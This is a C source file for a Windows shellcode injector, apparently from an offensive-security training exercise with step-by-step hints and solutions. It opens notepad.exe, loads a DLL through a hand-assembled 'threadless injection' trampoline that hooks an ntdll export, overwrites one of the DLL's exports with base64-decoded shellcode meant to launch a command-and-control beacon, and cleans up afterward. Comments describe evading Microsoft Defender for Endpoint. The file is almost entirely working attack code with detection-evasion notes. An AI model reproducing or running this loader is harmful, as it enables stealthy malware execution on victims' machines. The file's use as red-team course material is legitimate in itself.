#include <windows.h>
#include "psapi.h"
#include <TlHelp32.h>
#include "sc.h"
#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define EXPORTEDFUNCTION "DllCanUnloadNow"
#define DLLPATH L"C:\\windows\\system32\\winmde.dll"
#define DLLNAME "winmde.dll"
#define INJECTEDPROCESS "notepad.exe"

/************************************************************************************/
/*                                                                                  */
/*                               TYPE DEFINITIONS                                   */
/*                                                                                  */
/************************************************************************************/

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef BOOL(NTAPI* pCloseHandle)(HANDLE hObject);
typedef DWORD(NTAPI* pGetLastError)(HANDLE hObject);

typedef BOOL(NTAPI* plstrlenW)(
    LPCWSTR lpString
);

typedef BOOL(NTAPI* pReadFile)(
    IN                HANDLE       hFile,
    OUT               LPVOID       lpBuffer,
    IN                DWORD        nNumberOfBytesToRead,
    OUT               LPDWORD      lpNumberOfBytesRead,
    OUT               LPOVERLAPPED lpOverlapped
);

typedef ULONG(NTAPI* pRtlNtStatusToDosError)(
    NTSTATUS status
);

typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID*               BaseAddress,
    IN OUT PULONG           RegionSize,
    IN ULONG                FreeType
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID*           BaseAddress,
    IN ULONG                ZeroBits,
    IN OUT PULONG           RegionSize,
    IN ULONG                AllocationType,
    IN ULONG                Protect
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PULONG           NumberOfBytesToProtect,
    IN ULONG                NewAccessProtection,
    OUT PULONG              OldAccessProtection
);

typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    OUT PVOID               Buffer,
    IN ULONG                NumberOfBytesToRead,
    OUT PULONG              NumberOfBytesReaded OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
	OUT PHANDLE             ProcessHandle,
	IN ACCESS_MASK          AccessMask,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PCLIENT_ID           ClientId
);

typedef struct _ntdll {
	HMODULE ntdll;
    HMODULE k32;
	struct {
		pNtOpenProcess NtOpenProcess;
		pNtWriteVirtualMemory NtWriteVirtualMemory;
		pNtReadVirtualMemory NtReadVirtualMemory;
		pNtProtectVirtualMemory NtProtectVirtualMemory;
        pNtAllocateVirtualMemory NtAllocateVirtualMemory;
        pNtCreateThreadEx NtCreateThreadEx;
        pNtFreeVirtualMemory NtFreeVirtualMemory;
        pRtlNtStatusToDosError RtlNtStatusToDosError;

        pReadFile ReadFile;
        plstrlenW lstrlenW;
        pCloseHandle CloseHandle;
        pGetLastError GetLastError;
	} api;
	
} NTDLLAPI;

NTDLLAPI ntdll;

/************************************************************************************/
/*                                                                                  */
/*                            FUNCTIONS DEFINITIONS                                 */
/*                                                                                  */
/************************************************************************************/

// The encoding table used by the base64
static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/' };
static char* decoding_table = NULL;

// Build the decoding table that will be used by the base64_decode function
void build_decoding_table() {

    decoding_table = (char*)malloc(256);
    if (decoding_table == NULL) {
        DEBUG("[x] Cannot allocate memory for the decoding table\n");
        exit(-1);
    }
    for (int i = 0; i < 64; i++) {
        decoding_table[(unsigned char)encoding_table[i]] = i;
    }
}

/****************************************************************/
/* This function is used to debase64 a string                   */
/* base64_decode(sc, sc_length, &szOutput);                     */
/****************************************************************/
unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {

    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') {
        (*output_length)--;
    }
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char* decoded_data = (unsigned char*)malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        DWORD sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        DWORD sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        DWORD sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        DWORD sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        DWORD triple = (sextet_a << 3 * 6)
            + (sextet_b << 2 * 6)
            + (sextet_c << 1 * 6)
            + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}

/************************************************************/
/* This function takes the name of a process and store its  */
/* PID in the PID parameter and return the process HANDLE   */
/* The PID is NULL if the function failed                   */
/*                                                          */
/* HANDLE proc = getProcHandlebyName(L"notepad.exe", &pid); */
/************************************************************/
HANDLE getProcHandlebyName(LPSTR procName, DWORD* PID) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

    // Get a list of all currently running process
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		DEBUG("[x] Cannot retrieve the processes snapshot\n");
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
            // Parse each process information
			if (strcmp((entry.szExeFile), procName) == 0) {
                // Retrieve the PID of the right process
				*PID = entry.th32ProcessID;
				DEBUG("[+] Injecting into : %d\n", *PID);
                // Open an handle on this process
				HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
				if (!hProc) {continue;}
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

    // Return NULL if no process have been found or opened
	return NULL;
}

/****************************************************************/
/* This function is used to retrieve the base address of a DLL  */
/* loaded in a remote process.                                  */
/****************************************************************/
DWORD64 getDLLBaseAddress(HANDLE processHandle, char* dllName) {
	HMODULE modules[1024];
	SIZE_T modulesSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;

    // Retrieve the list of the modules directly from the PEB on the
    // remote process
	EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded);
	SIZE_T modulesCount = modulesSizeNeeded / sizeof(HMODULE);

    // Enumerate all modules until the wanted one is found
	for (size_t i = 0; i < modulesCount; i++){
		HMODULE remoteModule = modules[i];
		CHAR remoteModuleName[128];
        // Retrieve the module name
		GetModuleBaseNameA(
			processHandle,
			remoteModule,
			remoteModuleName,
			sizeof(remoteModuleName)
		);

        // Return the module address if the name match
		if (_stricmp(remoteModuleName, dllName) == 0) {
			return (DWORD64)modules[i];
		}
	}
	return -1;
}


/***********************************************************************/
/* Exactly like GetProcAddress, but work on a remote process.          */
/* This is needed when we want to hook a remote function               */
/* functionAdd = getProcAddressEx(procHandle, dllBaseAddress, fctName) */
/***********************************************************************/
DWORD64 getProcAddressEx(HANDLE processHandle, DWORD64 baseAddress, char* functionName) {
    // This function will retrieve the DLL PE Header and enumerate its export directory
    // until it find the function name.

	void* buffer = calloc(0x1000, sizeof(char));
	if (!buffer) {
		return NULL;
	}
	DWORD bufferSize = 0x1000;

    // Retrieve the PE header bytes to access to the DLL export directory
	DWORD status = ReadProcessMemory(processHandle, (PVOID)baseAddress, buffer, bufferSize, NULL);
	if (!status) {
		DEBUG("[x] Cannot read process memory : %d\n", GetLastError());
		return -1;
	}

    // Map the retrieved byte to the PE header structures
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)buffer + dosHeader->e_lfanew);
	IMAGE_DATA_DIRECTORY* dataDirectory = ntHeader->OptionalHeader.DataDirectory;

    // Retrieve the export directory address
	DWORD exportDirectoryRVA = dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	IMAGE_EXPORT_DIRECTORY exportDirectory;

    // Retrieve the export directory content
	status = ReadProcessMemory(processHandle, (PVOID)(exportDirectoryRVA + baseAddress), &exportDirectory, sizeof(IMAGE_EXPORT_DIRECTORY), NULL);
	if (!status) {
		DEBUG("[x] Cannot read export directory : %d\n", GetLastError());
		return -1;
	}

    // Once the export directory is found, just enumerate each entry
	for (int i = 0; i < exportDirectory.NumberOfFunctions; i++) {
		char* name = calloc(100, sizeof(char));
		if (!name) {
			DEBUG("[x] Cannot allocate function name buffer\n");
			return -1;
		}
		DWORD offset;

        // Read the process memory to retrieve the address where the name of the current function
        // is stored
		status = ReadProcessMemory(processHandle, baseAddress + exportDirectory.AddressOfNames + i * sizeof(DWORD), &offset, sizeof(DWORD), NULL);
		if (!status) {
			DEBUG("[x] Cannot read address of names : \n", GetLastError());
			return -1;
		}

        // Then retrieve the name of the function
		PVOID nameAddress = ((DWORD64)baseAddress + offset);
		status = ReadProcessMemory(processHandle, nameAddress, name, 100, NULL);
		if (!status) {
			DEBUG("[x] Cannot read name address : %d\n", GetLastError());
			return -1;
		}

        // If the function is the one we want
		if (strcmp(name, functionName) == 0) {
			WORD offsetOrdinal = -1;
			DWORD offsetFunction = -1;

            // Retrieve its ordinal to get its offset in the memory
			status = ReadProcessMemory(processHandle, baseAddress + exportDirectory.AddressOfNameOrdinals + i * sizeof(WORD), &offsetOrdinal, sizeof(WORD), NULL);
			if (!status) {
				DEBUG("[x] Cannot read ordinal value : %d\n", GetLastError());
				return -1;
			}

            // Finally, retrieve its RVA
			status = ReadProcessMemory(processHandle, baseAddress + exportDirectory.AddressOfFunctions + offsetOrdinal * sizeof(DWORD), &offsetFunction, sizeof(DWORD), NULL);
			if (!status) {
				DEBUG("[x] Cannot read function RVA : %d\n", GetLastError());
				return -1;
			}
			
            // That's it, return the function address
			DWORD64 functionAddr = baseAddress + offsetFunction;
			return functionAddr;
		}
	}

	return -1;

}

/************************************************************************************/
/*                                                                                  */
/*                                 NEW FUNCTIONS                                    */
/*                                                                                  */
/************************************************************************************/


/****************************************************************/
/* This function resolve the Nt functions and store them in the */
/* NTDLLAPI structure for further use                           */
/****************************************************************/
BOOLEAN loadNtThings(NTDLLAPI* ntdll) {
    ntdll->ntdll = GetModuleHandle("NTDLL.DLL", NULL);
    if (!ntdll) { return FALSE; }
    ntdll->api.NtOpenProcess = GetProcAddress(ntdll->ntdll, "NtOpenProcess");
    ntdll->api.NtWriteVirtualMemory = GetProcAddress(ntdll->ntdll, "NtWriteVirtualMemory");
    ntdll->api.NtReadVirtualMemory = GetProcAddress(ntdll->ntdll, "NtReadVirtualMemory");
    ntdll->api.NtProtectVirtualMemory = GetProcAddress(ntdll->ntdll, "NtProtectVirtualMemory");
    ntdll->api.NtAllocateVirtualMemory = GetProcAddress(ntdll->ntdll, "NtAllocateVirtualMemory");
    ntdll->api.NtCreateThreadEx = GetProcAddress(ntdll->ntdll, "NtCreateThreadEx");
    ntdll->api.NtFreeVirtualMemory = GetProcAddress(ntdll->ntdll, "NtFreeVirtualMemory");
    ntdll->api.RtlNtStatusToDosError = GetProcAddress(ntdll->ntdll, "RtlNtStatusToDosError");

    ntdll->k32 = GetModuleHandle("KERNEL32.DLL", NULL);
    //ntdll->api.ReadFile = GetProcAddress(ntdll->k32, "ReadFile");
    ntdll->api.ReadFile = GetProcAddress(ntdll->ntdll, "NtReadFile");
    ntdll->api.CloseHandle = GetProcAddress(ntdll->k32, "CloseHandle");
    ntdll->api.GetLastError = GetProcAddress(ntdll->k32, "GetLastError");
    return TRUE;
}



/****************************************************************/
/* This function compel a remote process to execute a given     */
/* code using the threadless injection technique                */
/****************************************************************/
BOOLEAN threadlessThread(NTDLLAPI* ntdll, HANDLE processHandle, PVOID executableCodeAddress, PVOID exportAddress) {
    PBYTE trampoline = calloc(76, sizeof(BYTE));
    if (!trampoline) { return FALSE; }    
    
    // This trampoline is used to save the function inital context and redirect to
    // the memory space containing the malicious code. Then, once the malicious code
    // is executed, it will restore the context and redirect to the initial code.
    BYTE trampolineStk[75] = {
        0x58,                                                           // pop RAX
        0x48, 0x83, 0xe8, 0x0c,                                         // sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
        0x50,                                                           // push RAX
        0x55,															// PUSH RBP
        0x48, 0x89, 0xE5,                                               // MOV RBP, RSP
        0x48, 0x83, 0xec, 0x08,                                         // SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
        0x51,                                                           // push RCX                         : just save the context registers
        0x52,                                                           // push RDX
        0x41, 0x50,                                                     // push R8
        0x41, 0x51,                                                     // push R9
        0x41, 0x52,                                                     // push R10
        0x41, 0x53,                                                     // push R11
        0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RCX, 0x0000000000000000   : restore the hooked function code
        0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RDX, 0x0000000000000000   : restore the hooked function code
        0x48, 0x89, 0x08,                                               // mov qword ptr[rax], rcx          : restore the hooked function code
        0x48, 0x89, 0x50, 0x08,                                         // mov qword ptr[rax+0x8], rdx      : restore the hooked function code
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
        0xff, 0xd0,                                                     // call RAX                         : Call the malicious code
        0x41, 0x5b,                                                     // pop R11                          : Restore the context
        0x41, 0x5a,                                                     // pop R10
        0x41, 0x59,                                                     // pop R9
        0x41, 0x58,                                                     // pop R8
        0x5a,                                                           // pop RDX
        0x59,                                                           // pop RCX
        0xc9,                                                           // leave
        0xc3                                                            // ret      
    };
    DWORD trampSize = 75;
    CopyMemory(trampoline, trampolineStk, trampSize * sizeof(BYTE));

    DWORD64 highBytePatched = 0;
    DWORD64 lowBytePatched = 0;
    SIZE_T szOutput = 0;

    // Save the instruction of the hooked function
    // It is mandatory to save this information in order to be able
    // to restore the hook once the execution finished
    BOOLEAN status = ntdll->api.NtReadVirtualMemory(processHandle, exportAddress, &highBytePatched, sizeof(DWORD64), &szOutput);
    status = ntdll->api.NtReadVirtualMemory(processHandle, (PVOID)((DWORD64)exportAddress + sizeof(DWORD64)), &lowBytePatched, sizeof(DWORD64), &szOutput);
    PVOID pageToProtect = exportAddress;


    SIZE_T pageSize = 2 * sizeof(DWORD64);
    DWORD oldProtect;
    NTSTATUS ntStatus = ntdll->api.NtProtectVirtualMemory(processHandle, &pageToProtect, &pageSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    DWORD64 tmp = highBytePatched;
    
    // Replace the place holders in the trampoline shellcode
    // with the righ values
    CopyMemory(trampoline + 26, &highBytePatched, sizeof(DWORD64));
    CopyMemory(trampoline + 36, &lowBytePatched, sizeof(DWORD64));
    CopyMemory(trampoline + 53, &executableCodeAddress, sizeof(DWORD64));


    // Write the trampoline somewhere in memory
    // Here VirtualAlloc is used, but some code cave can be used to limit this call
    // As the trampoline size is lesser than 4Ko, we should be ok for EDR detections
    PVOID trampolineAddress = NULL;
    SIZE_T trampolineSize = trampSize * sizeof(BYTE);
    ntStatus = ntdll->api.NtAllocateVirtualMemory(processHandle, &trampolineAddress, 0, &trampolineSize, MEM_COMMIT, PAGE_READWRITE);
    status = NT_SUCCESS(ntStatus);
    ntStatus = ntdll->api.NtWriteVirtualMemory(processHandle, trampolineAddress, trampoline, trampolineSize, &szOutput);
    status = NT_SUCCESS(ntStatus);
    ntStatus = ntdll->api.NtProtectVirtualMemory(processHandle, &trampolineAddress, &trampolineSize, PAGE_EXECUTE_READ, &szOutput);
    status = NT_SUCCESS(ntStatus);
    DEBUG("[+] Shellcode written at : %p\n", trampolineAddress);


    // Create the hook that will be placed in the remote function
    PBYTE shellcode = calloc(12, sizeof(BYTE));
    if (!shellcode) { return FALSE; }
    BYTE shellcodeStk[12] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov RAX, 0x0000000000000000
        0xFF, 0xD0                                                  // call RAX
    };

    // Replace the place holder
    CopyMemory(shellcode, shellcodeStk, 12 * sizeof(BYTE));
    CopyMemory(shellcode + 2, &trampolineAddress, sizeof(DWORD64));
    // Write the hook in memory
    ntStatus = ntdll->api.NtWriteVirtualMemory(processHandle, exportAddress, shellcode, 12 * sizeof(BYTE), &szOutput);
    //system("PAUSE");
    PBYTE exportContent = calloc(12, sizeof(BYTE));
    if (!exportContent) { return FALSE; }
    DWORD hookCalled = 0;
    
    do {
        DEBUG("[-] Waiting 10 seconds for the hook to be called...\n");
        Sleep(10000);
        // Check if the hook has been re-patched ie has been successfully executed
        ntStatus = ntdll->api.NtReadVirtualMemory(processHandle, exportAddress, exportContent, 12 * sizeof(BYTE), &szOutput);
        hookCalled = memcmp(shellcode, exportContent, 12 * sizeof(BYTE));
    } while (!hookCalled);

    // Just remove all artifacts in memory
    DEBUG("[+] Hook called ! Releasing artifacts\n");
    ntStatus = ntdll->api.NtFreeVirtualMemory(processHandle, &trampolineAddress, NULL, MEM_DECOMMIT|MEM_RELEASE);
    ntStatus = ntdll->api.NtProtectVirtualMemory(processHandle, &pageToProtect, &pageSize, oldProtect, &oldProtect);
    free(shellcode);
    free(trampoline);
    free(exportContent);
    DEBUG("[+] Artifacts released, enjoy your beacon.\n");
    
    return TRUE;
}

/****************************************************************/
/* This function is used to inject a given DLL in a remote      */
/* process                                                      */
/****************************************************************/
BOOL injectDLL(LPCWSTR moduleToInject, HANDLE processHandle) {

    // Allocate memory in the remote process to write the DLL name
    // that will be injected.
    // WCHAR is used as LoadLibraryW will be used to load the DLL
	SIZE_T regionSize = wcslen(moduleToInject) * sizeof(WCHAR);
	NTSTATUS ntStatus;
	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, regionSize, MEM_COMMIT, PAGE_READWRITE);
	if (!remoteBuffer) {
		DEBUG("[x] Cannot allocate space for the dll name into the remote process\n");
		return FALSE;
	}

	// Then write the DLL name in the allocated space
	BOOL status = WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, regionSize, NULL);
	if (!status) {
		DEBUG("[x] Cannot write the dll name into the remote process memory\n");
		return FALSE;
	}

    // Retrieve the LoadLibraryW function address
	HMODULE kernel32 = GetModuleHandle("KERNEL32.DLL", NULL);
	if (!kernel32) {
		DEBUG("[x] Cannot retrieve Kernel32 module\n");
		return FALSE;
	}

	PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(kernel32, "LoadLibraryW");
	if (!threadRoutine) {
		DEBUG("[x] Cannot find function address through GetProcAddress\n");
		return FALSE;
	}
	
    // Create a new thread starting at LoadLibraryW with the DLL name buffer
    // address as parameter.
    // This will execute LoadLibraryW(L"DLLName") in the remote process
	HANDLE dllThread;
	DEBUG("[+] Buffer address : %p\n", remoteBuffer);

    /****************************************************************/
    /*            THREADLESS INJECTION MODIFICATION                 */
    /****************************************************************/
    
    // Simple shellcode that will call LoadLibraryW with the given parameters
	BYTE loadLibraryStk[32] = {
		0x55,															// PUSH RBP
		0x48, 0x89, 0xE5,												// MOV RBP, RSP
		0x48, 0x83, 0xEC, 0x30,											// SUB RSP, 0x30 : space needed for LoadLibrary to not fuck the stack
		0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // MOV RCX, 0x0000000000000000  -> module name
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // MOV RAX, 0x0000000000000000  -> loadLibraryW address
		0xFF, 0xD0,														// CALL RAX
		0xC9,															// LEAVE
		0xC3,															// RET
	};


	PBYTE loadLibrary = calloc(32, sizeof(BYTE));
	if (!loadLibrary) {	return FALSE; }
    // Replace the placeholders
	CopyMemory(loadLibrary, loadLibraryStk, 32 * sizeof(BYTE));
	CopyMemory(loadLibrary + 10, &remoteBuffer, sizeof(DWORD64));
	CopyMemory(loadLibrary + 20, &threadRoutine, sizeof(DWORD64));

	PVOID loadLibraryAddress = NULL;
	SIZE_T pageSize = 32 * sizeof(BYTE);
	SIZE_T szOutput;

    // Write the shellcode in memory
    // It can also be done using code cave
	ntStatus = ntdll.api.NtAllocateVirtualMemory(processHandle, &loadLibraryAddress, 0, &pageSize, MEM_COMMIT, PAGE_READWRITE);
	ntdll.api.NtWriteVirtualMemory(processHandle, loadLibraryAddress, loadLibrary, pageSize, &szOutput);
	ntdll.api.NtProtectVirtualMemory(processHandle, &loadLibraryAddress, &pageSize, PAGE_EXECUTE_READ, &szOutput);
	DEBUG("[-] LoadLibrary address : 0x%p\n", loadLibraryAddress);

    // Run the threadless thread
	threadlessThread(&ntdll, processHandle, loadLibraryAddress, ntdll.api.ReadFile);

    // Clean the shellcode from memory
	ntdll.api.NtFreeVirtualMemory(processHandle, &loadLibraryAddress, &pageSize, MEM_DECOMMIT | MEM_RELEASE);
	
    /****************************************************************/
    /*                   END MODIFICATIONS                          */
    /****************************************************************/
    return TRUE;
}


int main(void){
    /*************************************************************/
    /* The goal is to implement a injector that will load a DLL  */
    /* in a remote process and  use the allocated space to write */
    /* the malicious shellcode.                                  */
    /*************************************************************/

    loadNtThings(&ntdll);

    buildsc();
    size_t szOutput;
    unsigned char* scBytes = base64_decode(sc, sc_length, &szOutput);
	if (szOutput == 0) {
		DEBUG("[x] Base64 decode failed \n");
		return -1;
	}
    int scLength = szOutput;

    DWORD pid;
    HANDLE procHandle = getProcHandlebyName(INJECTEDPROCESS, &pid);
	if (!procHandle) {
		DEBUG("[x] Cannot get process handle\n");
		return -1;
	}

    // Step2 : Modify the CreateRemotThread used for the remote DLL injection
    // Hint : You should store an additional shellcode on the remote process
    //        to run the LoadLibraryW(args)
    // Hands on: Same that for Step 1
    // Hands on : Look at the threadstack
    // Solution : The threadstack does not show any additional thread creation as the redirection of the
    //            execution flow is performed by hooking a function that is legitly called by the injected
    //            process.
    //            However, it shows some weird address. This is mainly due to the call of LoadLibrary that 
    //            f*cked up the thread stack. It is something that can be upgraded in the futur.
    BOOL injectionStatus = injectDLL(DLLPATH, procHandle);
	if (!injectionStatus) {
		DEBUG("[x] Cannot inject the DLL\n");
		return -1;
	}

	DWORD64 dllBaseAddress = getDLLBaseAddress(procHandle, DLLNAME);
	if (dllBaseAddress == -1) {
		DEBUG("[x] Cannot find dll base address\n");
		return -1;
	}

	DWORD64 entryPoint = getProcAddressEx(procHandle, dllBaseAddress, EXPORTEDFUNCTION);
	if (entryPoint == -1) {
		DEBUG("[x] Cannot find the function address\n");
		return -1;
	}

	SIZE_T sz;
	PBYTE saveFunction = calloc(scLength, sizeof(BYTE));
	DWORD status = ReadProcessMemory(procHandle, entryPoint, saveFunction, scLength * sizeof(BYTE), &sz);
	if (!status) {
		DEBUG("[x] Cannot read process memory to get stomped function code : %d\n", GetLastError());
		return -1;
	}
	
	status = WriteProcessMemory(procHandle, entryPoint, scBytes, scLength * sizeof(BYTE), &sz);
	if (!status) {
		DEBUG("[x] Cannot write process memory : %d\n", GetLastError());
		return -1;
	}

    // Step 1 : Modify this final CreateRemoteThread to check if still everything work fine
    // Hint : You can first try to target Notepad with a ReadFile trigger
    // Hands on : Follow the execution flow with a debugger
    //            Try to retrieve the hook and the trampoline
    //            Verify that the trampoline rewritte the hook on the fly
    //            What happened when the mailicious code has been successfully executed ?
    // Solution : Set a breakpoint on the hooked function (GetLastError for example), then
    //            follow the execution flow. 
    //            You must first saw the execution going through the shellcode that set the
    //            trampoline address in RAX and then call RAX.
    //            Then, you should see the execution of the trampoline that first modify the 
    //            return address by POPing RAX, substracting 0x0c (the size of the shellcode) and
    //            rePUSHing it on the stack. Then, you should the the sequence that save the register
    //            context by pushing them on the stack. 
    //            The next step is the deletion of the initial shellcode set on the GetLastError. 
    //            The old instructions are set on RCX and RDX then copied to the address pointed to RAX
    //            with "mov qword [rax]".
    //            You can check that the GetLastError function has been fully restored at this point.
    //            Finally, the beacon address is stored in RAX and is called through CALL RAX.
    //            Once the beacon has been successfully executed, the context is restored on the register
    //            and the execution flow is reset to the start of GetLastError.
    //            Look at the presentation slide for a more graphical explanation !
	threadlessThread(&ntdll, procHandle, (PVOID)entryPoint, ntdll.api.ReadFile);

	status = WriteProcessMemory(procHandle, entryPoint, saveFunction, scLength * sizeof(BYTE), &sz);
	if (!status) {
		DEBUG("[x] Cannot rewrite initial code in process memory : %d\n", GetLastError());
		return -1;
	}

	return 0;


    /****************************************************************/
    /*                          MDE                                 */
    /****************************************************************/

    // You shouldn't see any specific alert at first as their is not any weird allocation neither nor
    // thread creation. For MDE, nothing special happened. The process injection should not be detected.
    // However, later, after a post-processing by MDE, some alert like "Suspicious memory protection" can
    // be raised. 
    // This is mainly due to the fact that the memory of the NTDLL copy is modified to RWX to write the 
    // shellcode. A good addition would be to modify the trampoline ASM code to perform the VirtualProtect
    // by itself.

    // The technique is not perfect. An intersting idea would be to use HWBP instead of hook to remove the
    // needs to overwritte the GetLastError API.
}